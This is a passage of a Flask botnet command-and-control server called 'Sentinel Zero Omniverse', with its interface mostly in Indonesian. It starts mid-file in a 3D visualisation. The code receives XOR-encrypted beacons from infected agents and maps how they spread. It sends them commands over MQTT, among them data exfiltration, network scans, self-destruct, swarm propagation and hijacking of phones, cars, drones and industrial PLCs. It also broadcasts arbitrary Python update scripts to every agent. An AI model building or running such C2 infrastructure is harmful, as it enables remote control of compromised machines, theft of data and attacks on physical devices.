                opacity: 0.8
            }});
            const tube = new THREE.Mesh(tubeGeometry, tubeMaterial);
            scene.add(tube);
            lines.push(tube);
        }});

        camera.position.set(0, 0, 300);
        camera.lookAt(0, 0, 0);

        const controls = new THREE.OrbitControls(camera, renderer.domElement);
        controls.enableDamping = true;
        controls.dampingFactor = 0.1;
        controls.rotateSpeed = 0.5;

        let autoRotate = true;
        const toggleAutoRotate = () => {{
            autoRotate = !autoRotate;
            controls.autoRotate = autoRotate;
            controls.autoRotateSpeed = 0.5;
        }};
        renderer.domElement.addEventListener('dblclick', toggleAutoRotate);

        function animate() {{
            requestAnimationFrame(animate);
            particleSystem.rotation.y += 0.0005;
            spheres.forEach((sphere, i) => {{
                const scale = 1 + Math.sin(Date.now() * 0.003 + i) * 0.1;
                sphere.scale.set(scale, scale, scale);
            }});
            lines.forEach((line, i) => {{
                line.material.opacity = 0.5 + Math.sin(Date.now() * 0.002 + i) * 0.3;
            }});
            controls.update();
            renderer.render(scene, camera);
        }}
        animate();

        window.addEventListener('resize', () => {{
            camera.aspect = container.clientWidth / container.clientHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(container.clientWidth, container.clientHeight);
        }});

        const info = document.createElement('div');
        info.style.position = 'absolute';
        info.style.top = '10px';
        info.style.left = '10px';
        info.style.color = '#FFA500';
        info.style.fontFamily = 'monospace';
        info.style.padding = '10px';
        info.style.backgroundColor = 'rgba(20,20,20,0.7)';
        info.style.border = '1px solid #FFA500';
        info.innerHTML = '<h4>🖱️ Controls:</h4><p>- Drag: Rotate<br>- Scroll: Zoom<br>- Double Click: Toggle Auto-Rotate</p>';
        container.appendChild(info);
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/agents')
def agents_live():
    now = datetime.now()
    agents_html = ""
    for agent_id in AGENT_LAST_SEEN.keys():
        last_seen = AGENT_LAST_SEEN[agent_id]
        status = "online" if (now - last_seen).total_seconds() < 300 else "offline"
        AGENT_STATUS[agent_id] = status
        time_str = last_seen.strftime("%Y-%m-%d %H:%M:%S")
        gen = AGENT_SWARM_MAP.get(agent_id, {}).get("generation", 0)
        via = AGENT_SWARM_MAP.get(agent_id, {}).get("infected_via", "manual")
        sev_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{via}</span>'

        agents_html += f'''
        <div style="border: 1px solid var(--text); margin: 15px 0; padding: 15px; background: rgba(30,30,30,0.8);">
            <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap;">
                <div>
                    <b style="font-size: 1.1em;">{agent_id}</b>
                    <span class="status-{status}">● {status.upper()}</span>
                    {sev_tag}
                </div>
                <div style="color: var(--text-secondary); font-size: 0.9em;">
                    {time_str}
                </div>
            </div>
            <div style="margin-top: 10px;">
                <a href="/command?agent={agent_id}"><button style="margin-right: 10px;">🎯 Command</button></a>
                <a href="/reports?agent={agent_id}"><button>📄 Reports</button></a>
            </div>
        </div>
        '''

    content = f'''
    <h2>👾 AGENT LIVE MONITOR — REAL-TIME STATUS & CONTROL</h2>
    <div class="card">
        <p><strong>🟢 Total Agent Terdaftar:</strong> {len(AGENT_LAST_SEEN)}</p>
        <p><strong>📡 Online (5 menit terakhir):</strong> {sum(1 for s in AGENT_STATUS.values() if s == "online")}</p>
        <p><strong>💤 Offline:</strong> {sum(1 for s in AGENT_STATUS.values() if s == "offline")}</p>
    </div>

    <div class="card">
        <h3>📋 Daftar Agent ({len(AGENT_LAST_SEEN)} Agent)</h3>
        {agents_html if agents_html else "<p style='color: var(--alert);'>Belum ada agent terdaftar.</p>"}
    </div>

    <script>
        // Tidak perlu auto-refresh — sudah di-handle global
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/command', methods=['GET', 'POST'])
def command_center():
    if request.method == 'POST':
        agent_id = request.form.get('agent_id', '').strip()
        cmd = request.form.get('command', '').strip()
        note = request.form.get('note', '').strip()
        data_json = request.form.get('data', '{}')

        if not agent_id or not cmd:
            return jsonify({"error": "Agent ID dan command wajib diisi"}), 400

        try:
            data = json.loads(data_json)
        except:
            data = {}

        command_data = {
            "cmd": cmd,
            "note": note,
            "data": data,
            "timestamp": datetime.now().isoformat(),
            "issued_by": "manual"
        }

        if agent_id.lower() == "all":
            count = 0
            for aid in AGENT_LAST_SEEN.keys():
                ACTIVE_COMMANDS[aid] = command_data.copy()
                if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                    topic = f"c2/agent/{aid}/cmd"
                    payload = json.dumps(ACTIVE_COMMANDS[aid])
                    MQTT_CLIENT.publish(topic, payload, qos=1)
                count += 1
            result = f"Command berhasil dikirim ke {count} agent"
        else:
            ACTIVE_COMMANDS[agent_id] = command_data

            if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                topic = f"c2/agent/{agent_id}/cmd"
                payload = json.dumps(command_data)
                MQTT_CLIENT.publish(topic, payload, qos=1)
                print(f"[MQTT] → {topic}: {payload}")
                result = "Command berhasil dikirim via MQTT"
            else:
                result = "Command disimpan — tunggu agent check-in (MQTT tidak tersedia)"

        return jsonify({"success": True, "message": result})

    agent_id = request.args.get('agent', '').strip()
    agent_options = "".join([f'<option value="{aid}">{aid} ({AGENT_STATUS.get(aid, "unknown")})</option>' for aid in AGENT_LAST_SEEN.keys()])

    content = f'''
    <h2>🎯 COMMAND CENTER — KIRIM PERINTAH KE AGENT</h2>
    <div class="card">
        <form method="POST">
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Pilih Agent:</label>
                <select name="agent_id" required>
                    <option value="">-- Pilih Agent --</option>
                    <option value="all">[ALL AGENTS]</option>
                    {agent_options}
                </select>
            </div>
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Command:</label>
                <select name="command" required>
                    <option value="idle">🔄 idle - Mode standby</option>
                    <option value="scan">🔍 scan - Deep network scan</option>
                    <option value="exfil">📤 exfil - Data exfiltration</option>
                    <option value="update">🆙 update - Self-update agent</option>
                    <option value="kill">💀 kill - Self-destruct</option>
                    <option value="swarm_activate">🕸️ swarm_activate - Activate neural propagation</option>
                    <option value="web_swarm_only">🌐 web_swarm_only - Web zombie hunter only</option>
                    <option value="silent_mode">👻 silent_mode - Stealth operation</option>
                    <option value="set_generation">🧬 set_generation - Set swarm generation</option>
                    <option value="mobile_control">📱 mobile_control - Hack smartphone</option>
                    <option value="car_hack">🚗 car_hack - Hack car</option>
                    <option value="arduino_control">🤖 arduino_control - Hack Arduino/ESP32</option>
                    <option value="drone_hijack">🛸 drone_hijack - Hijack drone</option>
                    <option value="plc_hack">🏭 plc_hack - Hack industrial PLC</option>
                    <option value="planetary_takeover">🌍 planetary_takeover - Launch apocalypse</option>
                </select>
            </div>
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Data (JSON - opsional):</label>
                <textarea name="data" rows="4" placeholder='{{"target_ip": "192.168.1.100", "device_type": "Android"}}' style="width: 100%; padding: 10px; border: 1px solid var(--text); background: rgba(30,30,30,0.8); color: var(--text);">{{}}</textarea>
            </div>
            <div style="margin-bottom: 20px;">
                <label style="display: block; margin-bottom: 8px;">Catatan (Opsional):</label>
                <input type="text" name="note" placeholder="Contoh: target CEO's iPhone" style="width: 100%; padding: 10px; border: 1px solid var(--text); background: rgba(30,30,30,0.8); color: var(--text);">
            </div>
            <button type="submit" style="background: var(--alert); color: white; border: 2px solid var(--alert);">🚀 KIRIM PERINTAH — OMNIVERSE CONFIRMED</button>
        </form>
    </div>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/reports')
def list_reports():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()

        export_links = '''
        <p>
            <a href="/export?format=json"><button>💾 Export JSON</button></a>
            <a href="/export?format=csv"><button>📊 Export CSV</button></a>
        </p>
        '''

        formatted_reports = []
        for r in reports[:50]:
            severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
            sev_class = "tag-high" if is_high_severity(r) else ""
            gen_tag = ""
            if r.get("type") == "swarm_infection":
                gen = r.get("data", {}).get("generation", 0)
                method = r.get("data", {}).get("method", "")
                gen_tag = f'<span class="tag tag-swarm">G{gen}</span> <span class="tag tag-web">{method}</span>'
            elif r.get("type") in ["mobile_control", "car_hacked", "arduino_controlled", "drone_hijacked", "plc_hacked"]:
                hw_type = r.get("type", "").replace("_", " ").title()
                gen_tag = f'<span class="tag tag-hardware">{hw_type}</span>'

            formatted_reports.append(f'''
<div style="margin: 15px 0; padding: 15px; border-left: 4px solid {'#FF4500' if is_high_severity(r) else '#FFA500'}; background: rgba(30,30,30,0.8);">
    <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
        <div><b>Agent:</b> {r.get("id", "unknown")}</div>
        <div><span class="tag {sev_class}">{severity}</span> {gen_tag}</div>
    </div>
    <div><b>Type:</b> {r.get("type", "beacon")}</div>
    <div><b>Target:</b> {r.get("data", {}).get("target", "N/A")}</div>
    <div><small><b>Time:</b> {r.get("timestamp", "N/A")} | IP: {r.get("beacon_ip", "N/A")}</small></div>
</div>
            ''')

        content = f'''
        <h2>📁 LAPORAN AGENT — OMNIVERSE ARCHIVE</h2>
        {export_links}
        <div class="terminal" id="reportTerminal">
            {"".join(formatted_reports) if formatted_reports else "<i style='color: var(--text-secondary);'>Belum ada laporan.</i>"}
        </div>
        {export_links}
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
    except Exception as e:
        return f"<h2>❌ Error</h2><pre>{e}</pre>"

@app.route('/export')
def export_reports():
    fmt = request.args.get('format', 'json')
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if fmt == 'csv':
            import csv
            from io import StringIO
            output = StringIO()
            writer = csv.writer(output)
            if reports:
                keys = reports[0].keys()
                writer.writerow(keys)
                for r in reports:
                    writer.writerow([r.get(key, "") for key in keys])
            output.seek(0)
            return output.getvalue(), 200, {
                'Content-Type': 'text/csv',
                'Content-Disposition': 'attachment; filename=reports.csv'
            }
        else:
            return jsonify(reports)
    except Exception as e:
        return str(e), 500

@app.route('/logs')
def live_logs():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        reports.reverse()
        logs = []
        for r in reports[:100]:
            ts = r.get("timestamp", "N/A")
            agent = r.get("id", "unknown")
            issue = r.get("issue", "N/A")
            rtype = r.get("type", "beacon")
            severity = "🔴 HIGH" if is_high_severity(r) else "🟢 LOW"
            sev_color = "#FF4500" if is_high_severity(r) else "#FFA500"
            logs.append(f'<span style="color:{sev_color};">[{ts}]</span> <b>[{agent}]</b> {severity} | Type: {rtype} | {issue}')

        content = f'''
        <h2>📜 LIVE LOGS — OMNIVERSE FEED</h2>
        <div class="terminal" id="logTerminal">
            <div id="logContent" style="color:#FFA500; font-family: 'Courier New';">
                {"".join(f"<div>{log}</div>" for log in logs) if logs else "<i>Belum ada log.</i>"}
            </div>
        </div>
        <p><small>Auto-refresh every 5s — no WebSocket needed.</small></p>
        '''
        return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)
    except Exception as e:
        return str(e)

@app.route('/beacon', methods=['POST'])
def beacon():
    encrypted_data = request.form.get('data')
    if not encrypted_data:
        return "Invalid", 400

    decrypted = xor_decrypt(encrypted_data)
    if not decrypted:
        return "Forbidden", 403

    try:
        data = json.loads(decrypted)
        agent_id = data.get("id", "unknown")
        data["timestamp"] = datetime.now().isoformat()
        data["beacon_ip"] = request.remote_addr

        AGENT_LAST_SEEN[agent_id] = datetime.now()

        if agent_id not in AGENT_SWARM_MAP:
            existing_agents = list(AGENT_SWARM_MAP.keys())
            parent = random.choice(existing_agents) if existing_agents else "ROOT"
            swarm_gen = data.get("system", {}).get("swarm_generation", 0)
            infected_via = data.get("system", {}).get("infected_via", "manual")
            AGENT_SWARM_MAP[agent_id] = {
                "parent": parent,
                "children": [],
                "ip": data.get("ip", "unknown"),
                "first_seen": data["timestamp"],
                "generation": swarm_gen,
                "infected_via": infected_via
            }
            if parent != "ROOT" and parent in AGENT_SWARM_MAP:
                AGENT_SWARM_MAP[parent]["children"].append(agent_id)

        with open(REPORT_FILE, "r+") as f:
            try:
                reports = json.load(f)
                if not isinstance(reports, list):
                    reports = []
            except:
                reports = []
            reports.append(data)
            if len(reports) > MAX_REPORTS:
                reports = reports[-MAX_REPORTS:]
            f.seek(0)
            json.dump(reports, f, indent=2, ensure_ascii=False)
            f.truncate()

        if is_high_severity(data):
            alert = f"🚨 <b>BUG KRITIS DITEMUKAN!</b>\n"
            alert += f"🆔 Agent: {agent_id}\n"
            alert += f"🎯 Target: {data.get('target', 'unknown')}\n"
            alert += f"🔧 Issue: {data.get('issue', 'unknown')}\n"
            alert += f"🕒 Waktu: {data['timestamp']}"
            send_alert(alert)

        cmd = ACTIVE_COMMANDS.get(agent_id, {"cmd": "idle"})
        if agent_id in ACTIVE_COMMANDS:
            del ACTIVE_COMMANDS[agent_id]

        return jsonify(cmd)

    except Exception as e:
        print(f"[BEACON ERROR] {e}")
        return "Error", 500

@app.route('/upload_upgrade', methods=['GET', 'POST'])
def upload_upgrade():
    if request.method == 'POST':
        if 'file' in request.files:
            file = request.files['file']
            if file.filename.endswith('.py'):
                global AGENT_UPGRADE_SCRIPT
                AGENT_UPGRADE_SCRIPT = file.read().decode('utf-8')
                count = 0
                for agent_id in list(AGENT_LAST_SEEN.keys()):
                    if agent_id not in ACTIVE_COMMANDS:
                        ACTIVE_COMMANDS[agent_id] = {
                            "cmd": "update",
                            "note": "AUTO: Mass upgrade initiated from C2",
                            "timestamp": datetime.now().isoformat(),
                            "issued_by": "c2_admin"
                        }
                        if MQTT_CLIENT and MQTT_CLIENT.is_connected():
                            topic = f"c2/agent/{agent_id}/cmd"
                            payload = json.dumps(ACTIVE_COMMANDS[agent_id])
                            MQTT_CLIENT.publish(topic, payload, qos=1)
                        count += 1
                return jsonify({"success": True, "message": f"Upgrade script uploaded and broadcasted to {count} agents"})
        return jsonify({"error": "Invalid file - must be .py"}), 400

    content = '''
    <h2>📤 UPLOAD UPGRADE SCRIPT — UPDATE SEMUA AGENT</h2>
    <div class="card">
        <form method="POST" enctype="multipart/form-data">
            <label>Upload agent.py baru:</label><br>
            <input type="file" name="file" accept=".py" required><br><br>
            <button type="submit" style="background: var(--text-secondary); color: black; border: 2px solid var(--text-secondary);">🚀 DEPLOY KE SEMUA AGENT — MASS UPGRADE</button>
        </form>
        <p><small>File akan dikirim ke semua agent aktif. Agent akan self-update otomatis.</small></p>
    </div>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/hardware')
def hardware_control():
    content = '''
    <h2>🚗 HARDWARE APOCALYPSE CONTROL CENTER</h2>
    <div class="card">
        <h3>📱 Mobile Devices</h3>
        <button onclick="sendCommand('mobile_control', '192.168.1.100', 'Android')" style="margin: 5px; background: var(--text); color: black;">Hack Android</button>
        <button onclick="sendCommand('mobile_control', '192.168.1.101', 'iOS')" style="margin: 5px; background: var(--text); color: black;">Hack iPhone</button>
    </div>

    <div class="card">
        <h3>🚗 Cars</h3>
        <button onclick="sendCommand('car_hack', '192.168.0.10', 'Toyota')" style="margin: 5px; background: var(--text); color: black;">Hack Toyota</button>
        <button onclick="sendCommand('car_hack', '192.168.0.11', 'Tesla')" style="margin: 5px; background: var(--text); color: black;">Hack Tesla</button>
    </div>

    <div class="card">
        <h3>🛸 Drones</h3>
        <button onclick="sendCommand('drone_hijack', '192.168.1.101', 'DJI Mavic')" style="margin: 5px; background: var(--text); color: black;">Hijack DJI</button>
    </div>

    <div class="card">
        <h3>🤖 Arduino/PLC</h3>
        <button onclick="sendCommand('arduino_control', '192.168.1.50', 'ESP32')" style="margin: 5px; background: var(--text); color: black;">Hack ESP32</button>
        <button onclick="sendCommand('plc_hack', '192.168.2.50', 'Siemens S7')" style="margin: 5px; background: var(--text); color: black;">Hack Factory</button>
    </div>

    <script>
    function sendCommand(cmd, target_ip, device_type) {
        const data = JSON.stringify({target_ip: target_ip, device_type: device_type});
        fetch('/command', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: `agent_id=all&command=${cmd}&note=Hardware+target&data=${encodeURIComponent(data)}`
        })
        .then(r => r.json())
        .then(data => {
            alert('Command sent to all agents!');
        })
        .catch(err => {
            alert('Error sending command');
        });
    }
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=0)

@app.route('/update')
def update():
    if AGENT_UPGRADE_SCRIPT:
        return AGENT_UPGRADE_SCRIPT, 200, {
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename=agent.py'
        }
    else:
        default_script = '''
print("✅ Agent updated to latest version")
import time
time.sleep(2)
print("🔄 Restarting...")
'''
        return default_script, 200, {
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename=agent.py'
        }

@app.route('/analytics')
def analytics():
    try:
        with open(REPORT_FILE, "r") as f:
            reports = json.load(f)
        if not isinstance(reports, list):
            reports = []
    except:
        reports = []

    ai_insight = neural_ai_analyze(reports)

    issue_types = {}
    targets = {}
    for r in reports[:200]:
        issue = r.get("issue", "Unknown")[:30]
        issue_types[issue] = issue_types.get(issue, 0) + 1
        target = r.get("target", "Unknown").split('/')[2] if '//' in r.get("target", "") else r.get("target", "Unknown")[:25]
        targets[target] = targets.get(target, 0) + 1

    issue_items = sorted(issue_types.items(), key=lambda x: x[1], reverse=True)[:10]
    target_items = sorted(targets.items(), key=lambda x: x[1], reverse=True)[:10]

    issue_labels = [item[0] for item in issue_items]
    issue_data = [item[1] for item in issue_items]
    target_labels = [item[0] for item in target_items]
    target_data = [item[1] for item in target_items]

    chart_labels = [item["time"] for item in AGENT_CHECKINS]
    chart_data = [item["online"] for item in AGENT_CHECKINS]

    content = f'''
    <h2>📈 NEURAL ANALYTICS & PREDICTION ENGINE</h2>

    <div class="ai-insight">
        <h3>🧠 NEURAL AI EXECUTIVE SUMMARY</h3>
        <pre style="color:var(--text-secondary); white-space: pre-wrap; font-weight: bold; font-size: 1.1em;">{ai_insight["summary"]}</pre>
        <p style="color: var(--alert); font-weight: bold; font-size: 1.2em;">🔮 PREDIKSI: {ai_insight["prediction"]}</p>
    </div>

    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 25px;">
        <div class="card">
            <h3>📊 Top 10 Issue Types</h3>
            <div class="chart-container">
                <canvas id="issueChart"></canvas>
            </div>
        </div>
        <div class="card">
            <h3>🎯 Top 10 Targets</h3>
            <div class="chart-container">
                <canvas id="targetChart"></canvas>
            </div>
        </div>
    </div>

    <div class="card">
        <h3>📈 Agent Online Trend (60 Menit)</h3>
        <div class="chart-container">
            <canvas id="agentTrendChart"></canvas>
        </div>
    </div>

    <script>
        const issueCtx = document.getElementById('issueChart').getContext('2d');
        new Chart(issueCtx, {{
            type: 'bar',
             {{
                labels: {json.dumps(issue_labels)},
                datasets: [{{
                     {json.dumps(issue_data)},
                    backgroundColor: Array({len(issue_labels)}).fill().map((_, i) => `hsla(${{i * 36}}, 100%, 50%, 0.7)`),
                    borderColor: Array({len(issue_labels)}).fill().map((_, i) => `hsla(${{i * 36}}, 100%, 50%, 1)`),
                    borderWidth: 2
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{ display: false }},
                    tooltip: {{
                        backgroundColor: 'rgba(30, 30, 30, 0.9)',
                        titleColor: '#FFA500',
                        bodyColor: '#FFFFFF'
                    }}
                }},
                scales: {{
                    x: {{
                        ticks: {{ color: '#FFA500' }},
                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                    }},
                    y: {{
                        beginAtZero: true,
                        ticks: {{ color: '#FFA500' }},
                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                    }}
                }},
                animation: {{
                    duration: 1500,
                    easing: 'easeOutBounce'
                }}
            }}
        }});

        const targetCtx = document.getElementById('targetChart').getContext('2d');
        new Chart(targetCtx, {{
            type: 'doughnut',
             {{
                labels: {json.dumps(target_labels)},
                datasets: [{{
                     {json.dumps(target_data)},
                    backgroundColor: [
                        'rgba(255, 165, 0, 0.8)',
                        'rgba(255, 215, 0, 0.8)',
                        'rgba(255, 69, 0, 0.8)',
                        'rgba(255, 99, 71, 0.8)',
                        'rgba(255, 20, 147, 0.8)',
                        'rgba(255, 140, 0, 0.8)',
                        'rgba(255, 105, 180, 0.8)',
                        'rgba(255, 0, 0, 0.8)',
                        'rgba(255, 255, 0, 0.8)',
                        'rgba(0, 255, 255, 0.8)'
                    ],
                    borderColor: '#000000',
                    borderWidth: 1
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{
                        labels: {{
                            color: '#FFA500',
                            font: {{ size: 12 }}
                        }}
                    }},
                    tooltip: {{
                        backgroundColor: 'rgba(30, 30, 30, 0.9)',
                        titleColor: '#FFA500',
                        bodyColor: '#FFFFFF'
                    }}
                }},
                animation: {{
                    animateRotate: true,
                    animateScale: true,
                    duration: 2000
                }}
            }}
        }});

        const trendCtx = document.getElementById('agentTrendChart').getContext('2d');
        new Chart(trendCtx, {{
            type: 'line',
             {{
                labels: {json.dumps(chart_labels)},
                datasets: [{{
                    label: 'Agent Online',
                     {json.dumps(chart_data)},
                    borderColor: '#FFA500',
                    backgroundColor: 'rgba(255, 165, 0, 0.1)',
                    tension: 0.3,
                    pointBackgroundColor: '#FF4500',
                    pointBorderColor: '#ffffff',
                    pointRadius: 4,
                    fill: true
                }}]
            }},
            options: {{
                responsive: true,
                plugins: {{
                    legend: {{
                        labels: {{
                            color: '#FFA500',
                            font: {{ size: 14 }}
                        }}
                    }},
                    tooltip: {{
                        backgroundColor: 'rgba(30, 30, 30, 0.9)',
                        titleColor: '#FFA500',
                        bodyColor: '#FFFFFF'
                    }}
                }},
                scales: {{
                    x: {{
                        ticks: {{ color: '#FFA500' }},
                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                    }},
                    y: {{
                        beginAtZero: true,
                        ticks: {{ color: '#FFA500' }},
                        grid: {{ color: 'rgba(255, 165, 0, 0.1)' }}
                    }}
                }},
                animation: {{
                    duration: 2000,
                    easing: 'easeInOutQuart'
                }}
            }}
        }});
    </script>
    '''
    return render_template_string(get_dashboard_template(), content=content, agents_online=sum(1 for s in AGENT_STATUS.values() if s == "online"), neural_active=True, risk_score=ai_insight.get("risk_score", 0))

# === RUN ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    print("="*70)
    print("🚀🚀🚀 SENTINEL ZERO OMNIVERSE — FLIPPER ZERO STYLE EDITION")
    print(f"🌐 Running on http://0.0.0.0:{port}")
    print(f"🔐 XOR Key: '{XOR_KEY}'")
    print(f"📡 MQTT Broker: {MQTT_HOST}:{MQTT_PORT}")
    print("🤖 Neural AI + Auto Command + Swarm Map + 3D Vis + Hardware Control + Mass Upgrade — ALL ACTIVE")
    print("="*70)

    threading.Thread(target=init_mqtt, daemon=True).start()
    app.run(host='0.0.0.0', port=port, debug=False)